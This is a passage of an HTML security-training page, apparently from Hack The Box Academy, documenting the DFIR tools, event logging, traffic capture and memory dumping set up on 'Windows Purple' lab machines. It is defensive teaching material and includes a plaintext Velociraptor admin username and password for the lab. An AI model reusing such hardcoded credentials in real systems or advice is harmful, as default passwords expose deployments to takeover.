<span class="hljs-number">06</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">01</span>:<span class="hljs-number">54</span> AM    &lt;DIR&gt;          Links
<span class="hljs-number">06</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">02</span>:<span class="hljs-number">33</span> AM       <span class="hljs-number">260</span>,<span class="hljs-number">371</span>,<span class="hljs-number">434</span> Microsoft<span class="hljs-selector-class">.DesktopAppInstaller_8wekyb3d8bbwe</span><span class="hljs-selector-class">.msixbundle</span>
<span class="hljs-number">06</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">02</span>:<span class="hljs-number">33</span> AM         <span class="hljs-number">5</span>,<span class="hljs-number">121</span>,<span class="hljs-number">145</span> Microsoft<span class="hljs-selector-class">.UI</span><span class="hljs-selector-class">.Xaml</span>.<span class="hljs-number">2.8</span><span class="hljs-selector-class">.x64</span><span class="hljs-selector-class">.appx</span>
<span class="hljs-number">06</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">02</span>:<span class="hljs-number">33</span> AM         <span class="hljs-number">6</span>,<span class="hljs-number">764</span>,<span class="hljs-number">349</span> Microsoft<span class="hljs-selector-class">.VCLibs</span><span class="hljs-selector-class">.x64</span>.<span class="hljs-number">14.00</span><span class="hljs-selector-class">.Desktop</span><span class="hljs-selector-class">.appx</span>
<span class="hljs-number">06</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">01</span>:<span class="hljs-number">54</span> AM    &lt;DIR&gt;          Music
<span class="hljs-number">06</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">01</span>:<span class="hljs-number">54</span> AM    &lt;DIR&gt;          Pictures
<span class="hljs-number">06</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">01</span>:<span class="hljs-number">54</span> AM    &lt;DIR&gt;          Saved Games
<span class="hljs-number">06</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">01</span>:<span class="hljs-number">54</span> AM    &lt;DIR&gt;          Searches
<span class="hljs-number">06</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">01</span>:<span class="hljs-number">54</span> AM    &lt;DIR&gt;          Videos
               <span class="hljs-number">3</span> File(s)    <span class="hljs-number">272</span>,<span class="hljs-number">256</span>,<span class="hljs-number">928</span> bytes
              <span class="hljs-number">16</span> Dir(s)   <span class="hljs-number">7</span>,<span class="hljs-number">156</span>,<span class="hljs-number">068</span>,<span class="hljs-number">352</span> bytes free

winrm&gt;
</code></pre>
<hr>
<h2 id="available-windows-dfir-toolset">Available Windows DFIR Toolset</h2>
<h3 id="introduction">Introduction</h3>
<p>This section provides an overview of the installed DFIR toolset within the Windows Purple module targets, detailing the available tools/solutions and their respective locations.</p>
<h3 id="dfir-toolset-installed">DFIR Toolset Installed</h3>
<p>Below is a list of the DFIR toolset installed on the Windows Purple module targets for <code>post-exploitation</code> forensic analysis purposes, along with their respective installation paths.</p>
<h4 id="system-monitoring-event-logging-">System Monitoring (Event Logging)</h4>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Path</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Sysmon</strong></td>
<td><code>C:\Windows\Sysmon64.exe</code></td>
<td>Provides detailed event logging and detection.</td>
</tr>
</tbody>
</table>
<h4 id="log-analysis">Log Analysis</h4>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Path</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Eric Zimmerman Tools</strong></td>
<td><code>C:\Tools\EZ-Tools</code></td>
<td>Forensic utilities for analyzing digital evidence, such as registry hives and event logs.</td>
</tr>
</tbody>
</table>
<h4 id="threat-detection-monitoring">Threat Detection &amp; Monitoring</h4>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Path</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Yara</strong></td>
<td><code>C:\Tools\yara\yara.exe</code></td>
<td>Signature-based file scanning tool.</td>
</tr>
<tr>
<td><strong>Chainsaw</strong></td>
<td><code>C:\Tools\Sigma\chainsaw\chainsaw_x86_64-pc-windows-msvc.exe</code></td>
<td>Command-line tool for parsing and hunting through Windows Event Logs.</td>
</tr>
<tr>
<td><strong>Sigma</strong></td>
<td><code>C:\Program Files\Python312\Scripts\sigma.exe</code></td>
<td>Generic signature format for SIEM rule creation.</td>
</tr>
<tr>
<td><strong>Zircolite</strong></td>
<td><code>C:\Tools\Sigma\zircolite\zircolite_win_x64_2.20.0.exe</code></td>
<td>Sigma-based EVTX log analysis.</td>
</tr>
<tr>
<td><strong>Osquery</strong></td>
<td><code>C:\Program Files\osquery\osqueryi.exe</code></td>
<td>Endpoint monitoring using SQL-like queries.</td>
</tr>
<tr>
<td><strong>Velociraptor</strong></td>
<td><code>C:\Program Files\Velociraptor</code> (<code>https://&lt;Target_IP&gt;:8889</code>)</td>
<td>Endpoint monitoring, collection, and response.</td>
</tr>
</tbody>
</table>
<p><strong>Notes</strong>:</p>
<ul>
<li>Specify the following credentials to log into <code>Velociraptor</code>:<ul>
<li>Username: <code>admin</code></li>
<li>Password: <code>P3n#31337@LOG</code></li>
</ul>
</li>
<li><code>Allow Windows Purple module targets to run for at least 5 minutes after spawning</code> to ensure that all services have fully initialized (including Velociraptor).</li>
</ul>
<h4 id="traffic-capturing">Traffic Capturing</h4>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Path</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Wireshark</strong></td>
<td><code>C:\Program Files\Wireshark</code></td>
<td>Packet capture tool for network traffic analysis.</td>
</tr>
</tbody>
</table>
<h4 id="memory-dumping">Memory Dumping</h4>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Path</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>DumpIt</strong></td>
<td><code>C:\Tools\Memory-Dump\DumpIt.exe</code></td>
<td>Memory dumping utility for memory forensics.</td>
</tr>
<tr>
<td><strong>WinPmem</strong></td>
<td><code>C:\Tools\Memory-Dump\winpmem_mini_x64_rc2.exe</code></td>
<td>Memory dumping utility for memory forensics.</td>
</tr>
</tbody>
</table>
<h4 id="memory-forensics">Memory Forensics</h4>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Path</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Volatility v2</strong></td>
<td><code>C:\Tools\Volatility2</code></td>
<td>Memory forensics tool for analyzing memory dumps.</td>
</tr>
<tr>
<td><strong>Volatility v3</strong></td>
<td><code>C:\Tools\volatility3</code></td>
<td>Memory forensics tool for analyzing memory dumps.</td>
</tr>
</tbody>
</table>
<h4 id="additional-telemetry">Additional Telemetry</h4>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Path</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>SilkETW</strong></td>
<td><code>C:\Tools\SilkETW\SilkETW\SilkETW.exe</code></td>
<td>C# wrappers for ETW.</td>
</tr>
<tr>
<td><strong>SealighterTI</strong></td>
<td><code>C:\Tools\SealighterTI.exe</code></td>
<td>Running Microsoft-Windows-Threat-Intelligence without a driver.</td>
</tr>
<tr>
<td><strong>AMSI-Monitoring-Script</strong></td>
<td><code>C:\Tools\AMSIScript\AMSIScriptContentRetrieval.ps1</code></td>
<td>Extracting script contents using the AMSI ETW provider.</td>
</tr>
<tr>
<td><strong>JonMon</strong></td>
<td><code>C:\Tools\JonMon</code></td>
<td>Collection of open-source telemetry sensors.</td>
</tr>
<tr>
<td><strong>Fibratus</strong> (Added after this module&#39;s release; not available in its targets)</td>
<td><code>C:\Program Files\Fibratus</code></td>
<td>Adversary tradecraft detection using behavior-driven rule engine and YARA memory scanner. Event logs can be viewed in Application logs in Event Viewer</td>
</tr>
</tbody>
</table>
<h4 id="adversary-simulation">Adversary Simulation</h4>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Path</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Atomic Red Team</strong> (Added after this module&#39;s release; not available in its targets)</td>
<td><code>C:\AtomicRedTeam</code></td>
<td>Small and highly portable detection tests based on MITRE&#39;s ATT\&amp;CK.</td>
</tr>
</tbody>
</table>
<h4 id="malware-process-pe-analysis">Malware/Process/PE Analysis</h4>
<table>
<thead>
<tr>
<th><strong>Tool</strong></th>
<th><strong>Path</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>CFF-Explorer</strong></td>
<td><code>C:\Tools\CFF-Explorer\CFF Explorer.exe</code></td>
<td>Tool designed for examining and editing Portable Executable (PE) files.</td>
</tr>
<tr>
<td><strong>Ghidra</strong></td>
<td><code>C:\Tools\Ghidra\ghidraRun.bat</code></td>
<td>Software reverse engineering (SRE) framework.</td>
</tr>
<tr>
<td><strong>x64dbg</strong></td>
<td><code>C:\Tools\x64dbg</code></td>
<td>Open-source x64/x32 debugger for windows.</td>
</tr>
<tr>
<td><strong>SpeakEasy</strong></td>
<td><code>C:\Tools\speakeasy</code></td>
<td>Modular, binary emulator designed to emulate Windows kernel and user mode malware.</td>
</tr>
<tr>
<td><strong>SysInternalsSuite</strong></td>
<td><code>C:\Tools\SysinternalsSuite</code></td>
<td>Sysinternals Troubleshooting Utilities.</td>
</tr>
<tr>
<td><strong>Get-InjectedThread</strong></td>
<td><code>C:\Tools\Get-InjectedThread.ps1</code></td>
<td>Looks for threads that were created as a result of code injection.</td>
</tr>
<tr>
<td><strong>Hollows_Hunter</strong></td>
<td><code>C:\Tools\hollows_hunter64.exe</code></td>
<td>Scans all running processes. Recognizes and dumps a variety of potentially malicious implants.</td>
</tr>
<tr>
<td><strong>Moneta</strong></td>
<td><code>C:\Tools\Moneta64.exe</code></td>
<td>Live usermode memory analysis tool for Windows with the capability to detect malware IOCs.</td>
</tr>
<tr>
<td><strong>PE-Sieve</strong></td>
<td><code>C:\Tools\pe-sieve64.exe</code></td>
<td>Detects malware running on the system, as well as collects the potentially malicious material for further analysis.</td>
</tr>
<tr>
<td><strong>API-Monitor</strong></td>
<td><code>C:\Tools\API Monitor</code></td>
<td>Monitors and controls API calls made by applications and services.</td>
</tr>
<tr>
<td><strong>PE-Bear</strong></td>
<td><code>C:\Tools\PE-bear</code></td>
<td>Multiplatform reversing tool for PE files.</td>
</tr>
<tr>
<td><strong>ProcessHacker</strong></td>
<td><code>C:\Tools\ProcessHacker</code></td>
<td>Monitors system resources, debugs software and detects malware.</td>
</tr>
<tr>
<td><strong>ProcMonX</strong></td>
<td><code>C:\Tools\ProcMonX.exe</code></td>
<td>Extended Process Monitor-like tool based on Event Tracing for Windows.</td>
</tr>
<tr>
<td><strong>Frida</strong> (Added after this module&#39;s release; not available in its targets)</td>
<td><code>C:\Program Files\Python312\Scripts\frida.exe</code></td>
<td>Dynamic instrumentation toolkit for reverse-engineers. Helps to trace, instrument, debug and hook API functions</td>
</tr>
<tr>
<td><strong>LitterBox</strong> (Added after this module&#39;s release; not available in its targets)</td>
<td><code>C:\Tools\LitterBox\litterbox.py</code></td>
<td>Malware sandbox environment for payload behavior testing.</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="windows-logs-traffic-captured">Windows Logs &amp; Traffic Captured</h2>
<p>In this section, we will explore the logs and traffic captures available on Windows Purple module targets, as well as how to access and manage them. Logging and traffic monitoring are essential for identifying suspicious activity. The logging and forensic mechanisms configured on Windows Purple module targets are designed to generate detailed, highly verbose logs, supporting both real-time monitoring and historical analysis.</p>
<hr>
<h3 id="event-logging">Event Logging</h3>
<p>Windows Purple module targets are equipped with verbose logging mechanisms to ensure comprehensive tracking and monitoring of system activities, including command execution, network connections, PowerShell usage, and security events. In this section, we will explore the various locations where these events can be reviewed and accessed.</p>
<p><strong>Sysmon Logs</strong></p>
<p><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon">Sysmon</a> (System Monitor) is a powerful system activity monitoring tool within the Microsoft Sysinternals suite. Sysmon works by installing a system <code>driver</code> and a Windows <code>service</code>, allowing it to capture detailed events that can be logged into the Windows Event Log for centralized analysis.</p>
<p>Sysmon logs provide detailed and granular information about system activities, including process creations with full command-line details, network connections with associated processes, changes to file creation times, and the loading of drivers or DLLs. Additionally, Sysmon can capture hashes of process image files, detect raw disk access, and log events from the early stages of the boot process, offering robust capabilities for tracking and analyzing potentially malicious behavior.</p>
<p>Sysmon logs can be viewed in the <code>Event Viewer</code> by navigating to <code>Applications and Services Logs</code> &gt; <code>Microsoft</code> &gt; <code>Windows</code> &gt; <code>Sysmon</code>. This folder contains detailed logs generated by Sysmon for analysis and monitoring.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/sysmon1.png" alt="Event Viewer showing Sysmon logs with 50,931 events."></p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/sysmon2.png" alt="Event Viewer displaying Sysmon logs with 51,106 events."></p>
<p>Sysmon logs are stored as part of the Windows Event Log system. The logs are located on disk at the following default path:</p>
<p><code>C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx</code></p>
<p><strong>Note</strong>: The Sysmon configuration file in use is located at <code>C:\Windows\System32\sysmonconfig-excludes-only.xml</code> (taken from <a href="https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig-excludes-only.xml">here</a>). We can specify and apply our own Sysmon configuration file by using Sysmon&#39;s binary <code>before</code> initiating the attack part of each section as follows.</p>
<p>&#x20; Windows Logs &amp; Traffic Captured</p>
<pre><code class="lang-cmd-session"><span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">Windows</span>&gt; <span class="hljs-selector-tag">sysmon64</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-c</span> <span class="hljs-selector-tag">path</span>\<span class="hljs-selector-tag">filename</span><span class="hljs-selector-class">.xml</span>
</code></pre>
<p><strong>Command Line Logging</strong></p>
<p>Command Line Logging captures information about processes and their command-line arguments, which is useful for detecting suspicious activity, such as unauthorized execution of commands. The relevant Windows event ID is <code>4688</code> (A new process has been created).</p>
<p>Event ID <code>4688</code> is logged whenever a process is created on the system, and it includes the following details:</p>
<ul>
<li>Process Name</li>
<li>Process ID (PID)</li>
<li>Command Line Arguments</li>
<li>User Account</li>
<li>Creation Time</li>
</ul>
<p>This log is invaluable for tracking process execution, especially in threat-hunting scenarios where attackers often execute commands or scripts. These events can be viewed in the <code>Event Viewer</code> under <code>Security</code>. It should be noted that both <code>Sysmon</code> and <code>JonMon</code> (covered later) also provide visibility into process creation.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/comlog1.png" alt="Event Viewer displaying security logs with details of a process creation event."></p>
<p>Event ID 4688 logs are stored in the <code>Security</code> logs of the Windows Event Log system. These logs are located on disk at the following default path:</p>
<p><code>C:\Windows\System32\winevt\Logs\Security.evtx</code></p>
<p><strong>PowerShell Logging</strong></p>
<p>PowerShell logging (Module and Script Block Logging) is an important security feature as attackers often leverage PowerShell to execute malicious code. Script block logging captures the full content of scripts that are executed, including obfuscated or dynamically generated code. This is crucial for detecting sophisticated attacks. The Event ID for Script Block Logging is <code>4104</code>.</p>
<p>PowerShell logs can be viewed in the <code>Event Viewer</code> by navigating to <code>Applications and Services Logs</code> &gt; <code>Microsoft</code> &gt; <code>Windows</code> &gt; <code>PowerShell</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/logging_14.png" alt="Event Viewer displaying PowerShell logs with Event ID 4104 for remote command execution."></p>
<p>PowerShell logs are stored as part of the Windows Event Log system. The logs are located on disk at the following default path:</p>
<p><code>C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx</code></p>
<p><strong>Console History</strong></p>
<p>PowerShell logs the command history of interactive console sessions, making it a valuable resource for tracking user activity and identifying potentially malicious behavior. This console history is stored in the user&#39;s profile directory at the following location:</p>
<p><code>C:\Users\%username%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></p>
<p><strong>Audit Policies</strong></p>
<p>Verbose auditing provides comprehensive tracking of both success and failure events across the system. Enabling all success and failure auditing using the <code>auditpol</code> command can provide a wealth of detailed event logs, offering deeper visibility into system activities.</p>
<p>Enabling all audit policies indiscriminately can lead to significant storage overhead due to the sheer volume of logs generated. This not only consumes system resources but can also complicate forensic investigations. A large volume of logs can make it difficult to sift through the noise and identify relevant events, potentially delaying incident response and analysis.</p>
<p>In real-world environments, it is essential to carefully fine-tune audit policies to strike the right balance between visibility and usefulness. By tailoring the policies to focus on high-priority activities  such as privileged account usage, access to sensitive files, and network connections  you can optimize storage usage and ensure the logs generated are actionable and relevant for security monitoring and forensics.</p>
<p>Audit policy logs provide detailed insights into system access, privilege usage, and security settings modifications. Audit policy logs are saved as part of the <code>Security</code> logs in the Windows Event Log system. These logs are stored on disk at the following default path:</p>
<p><code>C:\Windows\System32\winevt\Logs\Security.evtx</code></p>
<p>The Microsoft documentation <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/audit-policy-recommendations">Audit Policy Recommendations</a> provides detailed guidance on configuring audit policies for Windows environments. The article is part of the Security Best Practices series for Active Directory and focuses on fine-tuning audit settings to enhance system security while minimizing unnecessary overhead.</p>
<p><strong>Note</strong>: The enabled audit policies can be identified by executing the following command. Users can also define and apply their own (even custom) audit policies <code>before</code> initiating the attack part in each section.</p>
<p>&#x20; Windows Logs &amp; Traffic Captured</p>
<pre><code class="lang-cmd-session">C:\Users\Administrator&gt;auditpol /get /category:*

System audit policy
Category/Subcategory                      Setting
System
  Security System Extension               Success
  System Integrity                        Success <span class="hljs-keyword">and</span> <span class="hljs-literal">Failure</span>
  IPsec Driver                            Success
  Other System Events                     Success <span class="hljs-keyword">and</span> <span class="hljs-literal">Failure</span>
  Security State Change                   Success
Logon/Logoff
  Logon                                   Success <span class="hljs-keyword">and</span> <span class="hljs-literal">Failure</span>
  Logoff                                  Success
  Account Lockout                         Success
  IPsec Main Mode                         Success
  IPsec Quick Mode                        Success
  IPsec Extended Mode                     Success
  Special Logon                           Success
  Other Logon/Logoff Events               Success
  Network Policy Server                   Success <span class="hljs-keyword">and</span> <span class="hljs-literal">Failure</span>
  User / Device Claims                    Success
  <span class="hljs-keyword">Group</span> Membership                        Success
Object <span class="hljs-keyword">Access</span>
  <span class="hljs-keyword">File</span> System                             Success
  Registry                                Success
  Kernel Object                           Success
  SAM                                     Success
  Certification Services                  Success
  Application Generated                   Success
  Handle Manipulation                     Success
  <span class="hljs-keyword">File</span> Share                              Success
  Filtering Platform Packet Drop          Success
  Filtering Platform Connection           Success
  Other Object <span class="hljs-keyword">Access</span> Events              Success
  Detailed <span class="hljs-keyword">File</span> Share                     Success
  Removable Storage                       Success
  Central Policy Staging                  Success
Privilege <span class="hljs-keyword">Use</span>
  Non Sensitive Privilege <span class="hljs-keyword">Use</span>             Success
  Other Privilege <span class="hljs-keyword">Use</span> Events              Success
  Sensitive Privilege <span class="hljs-keyword">Use</span>                 Success
Detailed Tracking
  <span class="hljs-keyword">Process</span> Creation                        Success
  <span class="hljs-keyword">Process</span> Termination                     Success
  DPAPI Activity                          Success
  RPC Events                              Success
  Plug <span class="hljs-keyword">and</span> Play Events                    Success
  Token Right Adjusted Events             Success
Policy Change
  Audit Policy Change                     Success
  Authentication Policy Change            Success
  Authorization Policy Change             Success
  MPSSVC Rule-Level Policy Change         Success
  Filtering Platform Policy Change        Success
  Other Policy Change Events              Success
Account Management
  Computer Account Management             Success
  Security <span class="hljs-keyword">Group</span> Management               Success
  Distribution <span class="hljs-keyword">Group</span> Management           Success
  Application <span class="hljs-keyword">Group</span> Management            Success
  Other Account Management Events         Success
  User Account Management                 Success
DS <span class="hljs-keyword">Access</span>
  Directory Service <span class="hljs-keyword">Access</span>                Success
  Directory Service Changes               Success
  Directory Service Replication           Success
  Detailed Directory Service Replication  Success
Account Logon
  Kerberos Service Ticket Operations      Success
  Other Account Logon Events              Success
  Kerberos Authentication Service         Success
  Credential Validation                   Success
</code></pre>
<p><strong>Windows Firewall Logs</strong></p>
<p>Windows Firewall logs provide detailed information about inbound and outbound network connections, including allowed and blocked connections.</p>
<p>Windows Firewall logs provide valuable insights into the following:</p>
<ul>
<li>Source and destination IP addresses</li>
<li>Source and destination ports</li>
<li>Connection status (allowed/blocked)</li>
<li>Protocol used (TCP/UDP)</li>
</ul>
<p>By default, these logs are stored in the following location:</p>
<p><code>C:\Windows\System32\LogFiles\Firewall\pfirewall.log</code></p>
<p>The Windows Firewall logs information to the <code>pfirewall.log</code> file when it processes network traffic. The firewall log records all traffic that is either allowed or blocked. The screenshot below shows what this file looks like:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/logging_9.png" alt="Notepad displaying Windows Firewall log entries with allow and receive actions."></p>
<p><strong>Note</strong>: There is another event (Event ID 5156) that is logged by the <code>Windows Filtering Platform</code> (WFP), which is responsible for processing network packets. Event ID <code>5156</code> is logged whenever a network connection is allowed by the Windows Filtering Platform. If the computer or device shouldn&#39;t have access to the Internet, or contains only applications that dont connect to the Internet, monitor for <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5156">5156</a> events where the &quot;Destination Address&quot; falls outside private IP address ranges, indicating potential communication with the public Internet.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/logging_10.png" alt="Event Viewer displaying Event ID 5156, Windows Filtering Platform connection details."></p>
<p><strong>JonMon</strong></p>
<p><a href="https://github.com/jsecurity101/JonMon">JonMon</a> is an open-source research project that includes a <code>kernel-level driver</code> component which is designed to collect information related to system operations such as <code>process creation</code>, <code>registry operations</code>, <code>file creation</code>, and more. In addition to the kernel-level driver component, JonMon also features a <code>user-mode component</code> that collects information about <code>.NET</code>, <code>RPC</code>, <code>network activity</code>, and other important system events.</p>
<p>JonMon runs as a service in all Windows Purple module targets.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/logging_2.png" alt="Command prompt displaying &#39;sc query jonmon&#39; with service status running."></p>
<p>By combining data from both the kernel-level and user-mode components, JonMon provides users with a comprehensive view of their security activity. The data collected by both components is made easily accessible to users through the Windows event log, allowing users to quickly and easily query the data and gain insights into their system operations. JonMon-generated logs can be viewed in the <code>Event Viewer</code> by navigating to <code>Applications and Services Logs</code> &gt; <code>JonMon</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/logging_3.png" alt="Event Viewer displaying JonMon logs with Event ID 13 for network connection accepted."></p>
<p>More details on JonMon can be found in the Github Repository <a href="https://github.com/jsecurity101/JonMon">here.</a></p>
<p><strong>SealighterTI</strong></p>
<p>The <code>Microsoft-Windows-Threat-Intelligence</code> Event Tracing for Windows (ETW) provider is a robust tool for detecting process injection and other types of attacks. Unlike user-mode hooking or in-process ETW providers, evading or tampering with the Threat-Intelligence provider is notably challenging. <a href="https://github.com/pathtofile/SealighterTI">SealighterTI</a> facilitates the logging of events from the <code>Microsoft-Windows-Threat-Intelligence</code> provider into the Windows Event Log, enhancing visibility into such activities.</p>
<p><code>SealighterTI</code> runs in the background on all Windows Purple module targets via a scheduled task. The events it generates are logged under <code>Applications and Service Logs</code> &gt; <code>Sealighter</code> as shown in the screenshot below.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/logging_5.png" alt="Event Viewer displaying Sealighter logs with Event ID 1, showing threat intelligence data."></p>
<p>More details on <code>SealighterTI</code> can be found on the Github Repository <a href="https://github.com/pathtofile/SealighterTI">here</a>.</p>
<hr>
<h3 id="traffic-capturing">Traffic Capturing</h3>
<p>A batch script located at <code>C:\Tools\PCAP-Captures\Script\background\Traffic-Capture-Script.bat</code> is executed at boot via a scheduled task to initiate traffic capturing for the most common protocols. To enable more detailed traffic capturing, we can modify the script (<code>set CAPTURE_FILTER=</code> part) to include additional protocols (ports) as needed and then double-click on the <code>Stop-Traffic-Capture.bat</code> file located on the desktop to restart traffic capturing.</p>
<p>The abovementioned <code>Stop-Traffic-Capture.bat</code> batch script has been placed on the desktop to streamline the process of stopping, saving, and resuming network traffic capture. This script enables users to manage the traffic capture process seamlessly at any point and ensures that the data is preserved for later analysis.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/logging_8.png" alt="Desktop with icons including a batch script to stop and save captured traffic."></p>
<p><strong>Using the Traffic Capture Script</strong></p>
<ol>
<li><strong>Script Location:</strong>\
The batch script is located on the desktop for easy access. The script is named <code>Stop-Traffic-Capture.bat</code>.</li>
<li><strong>Purpose of the Script:</strong><ul>
<li><strong>Stop Traffic Capture:</strong> Halts the current traffic capture process.</li>
<li><strong>Save Captured Traffic:</strong> Saves the captured data in a <code>PCAP</code> format for further analysis.</li>
<li><strong>Continue Traffic Capture:</strong> Automatically resumes the capture process without any interruptions to the workflow.</li>
</ul>
</li>
<li><strong>Running the Script:</strong><ul>
<li>Double-click on the <code>Stop-Traffic-Capture.bat</code> file on the desktop.</li>
<li>Once the traffic capture has been stopped and saved, it will automatically restart and continue capturing new traffic in real time.</li>
</ul>
</li>
</ol>
<p>The GIF below shows the process of extracting captured PCAP by running the script.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/captured-pcap.gif" alt="GIF showcasing the process of extracting captured traffic in PCAP file format."></p>
<p>Captured traffic is saved in the form of PCAP files, which are commonly used for analyzing network traffic.</p>
<ul>
<li><strong>File Location:</strong>\
The captured traffic files are saved in the following directory: <code>C:\Tools\PCAP-Captures\Archives</code></li>
<li><strong>PCAP Files:</strong>\
Each captured session is stored in a separate <code>.pcap</code> file, and the files are named based on the timestamp of when the capture occurred, which allows for easy identification of the traffic logs based on the capture time.</li>
</ul>
<p>The captured traffic can be analyzed using tools such as Wireshark, which is also installed on the system at the path <code>C:\Program Files\Wireshark</code>. Heres how you can open the files in Wireshark:</p>
<ol>
<li>Launch <strong>Wireshark</strong> from the desktop shortcut.</li>
<li>Navigate to <code>File</code> &gt; <code>Open</code>.</li>
<li>Select the appropriate <code>.pcap</code> file from <code>C:\Tools\PCAP-Captures\Archives</code> to begin analyzing the captured traffic.</li>
</ol>
<hr>
<h2 id="dumping-analyzing-windows-memory">Dumping &amp; Analyzing Windows Memory</h2>
<p>In this section, we will explore the memory dumping and analysis tools available on Windows Purple module targets, as well as how to dump and analyze the memory of a Windows Purple module target.</p>
<hr>
<h3 id="dumping-memory">Dumping Memory</h3>
<p>Memory dumping is a vital capability in forensic investigations, enabling the capture of the current state of a system&#39;s volatile memory for detailed post-incident analysis. This snapshot provides a wealth of information, such as active processes, loaded drivers, network connections, and potential malicious artifacts that may not be visible on disk. Memory dumps are particularly useful for detecting malware, analyzing injection techniques, uncovering credentials stored in memory, and identifying other indicators of compromise that persist only in active memory during an attack.</p>
<p>In all Windows Purple module targets, memory dumping tools are available at the following location:</p>
<p><code>C:\Tools\Memory-Dump</code></p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/logging_11.png" alt="Memory-Dump folder containing Dumplt.exe and winpmem\_mini\_x64\_rc2.exe applications."></p>
<p><code>DumpIt</code> is a straightforward and user-friendly tool used to create a full memory dump of a system. A memory dump can be captured as follows:</p>
<p>&#x20; Dumping &amp; Analyzing Windows Memory</p>
<pre><code class="lang-cmd-session">C:\Tools\<span class="hljs-keyword">Memory</span>-Dump&gt;DumpIt.exe
  DumpIt - v1.3.2.20110401 - <span class="hljs-keyword">One</span> click <span class="hljs-keyword">memory</span> <span class="hljs-keyword">memory</span> dumper
  <span class="hljs-keyword">Copyright</span> (c) 2007 - 2011, Matthieu Suiche &lt;http:<span class="hljs-comment">//www.msuiche.net&gt;</span>
  <span class="hljs-keyword">Copyright</span> (c) 2010 - 2011, MoonSols &lt;http:<span class="hljs-comment">//www.moonsols.com&gt;</span>


    Address space size:        5368709120 bytes (   5120 Mb)
    Free space size:           5687996416 bytes (   5424 Mb)

<span class="hljs-comment">    * Destination = \??\C:\Tools\Memory-Dump\LOGGING-VM-20241126-111433.raw</span>

    --&gt; Are you sure you want to <span class="hljs-keyword">continue</span>? [y/<span class="hljs-keyword">n</span>] <span class="hljs-built_in">y</span>
    + Processing... Success.
</code></pre>
<p>The tool will generate a full memory dump file, typically saved in the same directory as the executable, which can then be used for forensic analysis.</p>
<p><a href="https://github.com/Velocidex/WinPmem">Winpmem</a> is another versatile tool for capturing a full memory dump of the system. The tool requires specifying an output path where the dump file will be saved as follows:</p>
<p>&#x20; Dumping &amp; Analyzing Windows Memory</p>
<pre><code class="lang-cmd-session">C:\Tools\Memory-Dump&gt;C:\Tools\Memory-Dump&gt;winpmem_mini_x64_rc2.exe memdump.raw
WinPmem64
Extracting driver to C:\Users\ADMINI~<span class="hljs-number">1</span>\AppData\Local\Temp\<span class="hljs-number">2</span>\pme84CC.tmp
Driver Unloaded.
Loaded Driver C:\Users\ADMINI~<span class="hljs-number">1</span>\AppData\Local\Temp\<span class="hljs-number">2</span>\pme84CC.tmp.
Deleting C:\Users\ADMINI~<span class="hljs-number">1</span>\AppData\Local\Temp\<span class="hljs-number">2</span>\pme84CC.tmp
The <span class="hljs-keyword">system</span> time is: <span class="hljs-number">12</span>:<span class="hljs-number">23</span>:<span class="hljs-number">28</span>
Will generate a RAW image
 - buffer_size_: <span class="hljs-number">0x1000</span>
CR3: <span class="hljs-number">0x00001AD000</span>
 <span class="hljs-number">6</span> memory ranges:
